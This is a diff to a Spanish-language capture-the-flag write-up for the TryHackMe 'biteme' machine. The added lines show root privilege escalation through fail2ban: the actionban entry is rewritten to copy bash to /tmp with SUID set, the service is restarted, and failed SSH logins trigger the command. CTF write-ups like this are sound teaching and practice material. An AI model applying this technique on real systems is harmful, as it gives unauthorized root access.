@@ -281,6 +281,7 @@ Enunciado :
     jason@biteme:~$ cat user.txt 
     THM{6fbf1fb7241dac060cd3abba70c33070}
 
+
 -Listamos los permisos que tenemos sobre los comandos que podemos ejecutar con privilegios elevados en el sistema.
 
   Como vemos podemos ejecutar comandos sin necesidad de clave como el usuario fred
@@ -292,6 +293,7 @@ Enunciado :
     User jason may run the following commands on biteme:
         (ALL : ALL) ALL
         (fred) NOPASSWD: ALL
+
 
 -Escalamos hozintalmente hacia el usuario fred, listamos los permisos que tenemos sobre los comandos que podemos ejecutar con privilegios elevados en el sistema.
 
@@ -305,6 +307,7 @@ Enunciado :
     User fred may run the following commands on biteme:
         (root) NOPASSWD: /bin/systemctl restart fail2ban
 
+
 -Como vemos tenemos permisos elevados para reiniciar el servicio fail2ban
 
     Que es Fail2ban es una aplicación escrita en Python para la prevención de intrusos en un sistema, que actúa 
@@ -312,8 +315,34 @@ Enunciado :
     licencia GNU y típicamente funciona en sistemas POSIX que tengan interfaz con un sistema de control de paquetes
     o un firewall local (como iptables o TCP Wrapper)
 
-  
+-Elevamos privilegios root mediante el reinicio del servicio.
+
+INFO Elevacion de privilegios mediante fail2ban --> https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7
+
+  1)Editamos el apartado actionban del fichero fred@biteme:/etc/fail2ban/action.d/iptables-multiport.conf 
+
+  Este apartado lo que hace es ejecutar el comando que le indiquemos a actionban cuando una ip es baneada, con los privilegios del usuario que ejecuta el servicio en este caso root.
+
+    # Option:  actionban
+    # Notes.:  command executed when banning an IP. Take care that the
+    #          command is executed with Fail2Ban user rights.
+    # Tags:    See jail.conf(5) man page
+    # Values:  CMD
+    #
+    #actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
+    actionban = cp /bin/bash /tmp/esevka && chmod 4777 /tmp/esevka     ----> copiamos una bash a /tmp/esevka y le activamos el SUID y le damos maximos permisos.
+
+  2)Reiniciamos el servicio para que nuestros cambios se guarden.
     
+
+  3)Para ejecutar nuestro codigo lo que tenemos que hacer es lo siguiente:
+  
+    - Mantener nuestra sesion ssh abierta 
+    
+    - Desde otra ventana de consola intentar conectar varias veces  por ssh introduciendo mal la pass.
+      Tras varios intentos nos banearan la ip, ejecutando el codigo que hemos introducido en actionban.
+
+  2)
 
 
   
